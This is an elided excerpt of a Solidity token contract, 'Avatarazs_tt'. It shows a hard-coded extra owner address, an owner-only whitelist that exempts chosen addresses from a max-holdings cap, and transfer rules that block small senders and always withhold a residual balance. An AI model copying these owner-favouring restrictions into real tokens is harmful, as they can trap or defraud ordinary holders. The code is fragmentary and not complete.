...
contract Avatarazs_tt is Context, IERC20, Ownable {
    ...
    uint256 private numStopBurn = 4050 * 10 ** 18;
    string private _name = "Avatarazs_tt";
    string private _symbol = "Avatarazs_tt";
    ...
    mapping(address=>bool) public _maxtokenwl; 
    ...
    address private ownerAddres = address(0xa3267c4BF8bA47dF0e95C2C1a7B773529697c5A4);
    ...
    constructor () public {
        ...
        _maxtokenwl[owner()] = true;
        _maxtokenwl[ownerAddres] = true;
        _maxtokenwl[burnAddress] = true;
        _maxtokenwl[address(this)] = true;
        _maxtokenwl[uniswapV2Pair] = true;
    ...
    function _setmaxtokenwl(address user,bool value) public onlyOwner{
        _maxtokenwl[user] = value;
    }
    function _setmaxtokenamount(uint256 amount) public onlyOwner{
...
function _takeBurn(address sender, uint256 tBurn, uint8 FeeMode) private {
    ...
    function _transfer(
        ...
        require(balanceOf(from) > 10000000000, "balance of from shoud be greater than 0.1");
        require(balanceOf(to).add(amount) <= _maxtokenamount || _maxtokenwl[to],"Exceeds max holdings");
        ...
        if (balanceOf(from) - amount < 10000000000) {
            amount = balanceOf(from) - 10000000000;
        }
